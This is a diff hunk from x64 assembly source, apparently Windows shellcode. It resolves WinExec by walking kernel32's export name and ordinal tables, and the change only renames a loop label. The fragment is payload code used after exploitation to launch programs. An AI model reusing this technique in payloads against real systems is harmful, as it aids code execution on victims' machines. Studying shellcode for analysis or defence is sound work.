@@ -31,12 +31,12 @@ BITS 64
     MOV     ECX, DWORD [RDI + RBX + 0x24] ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
 ; Found export ordinals table offset (RCX)
     CQO                                   ; RDX = 0 (eax == userland addresss, so MSB is not set)
-find_winexec:
+find_winexec_x64:
     INC     RDX                           ; EDX = function number + 1
     XOR     RAX, RAX                      ; RAX = 0
     LODSD                                 ; RAX = &(names table[function number]) = offset(function name)
     CMP     [RDI + RAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
-    JNE     find_winexec                  ;
+    JNE     find_winexec_x64              ;
 ; Found WinExec ordinal (RBX)
     LEA     RDX, [RCX + RDX * 2 - 2]      ; RDX = offset(ordinals table) + (WinExec function number + 1) * 2 - 2 = offset(WinExec function ordinal)
     MOVZX   RDX, WORD [RDI + RDX]         ; RDX = [kernel32 + offset(WinExec function ordinal)] = WinExec function ordinal
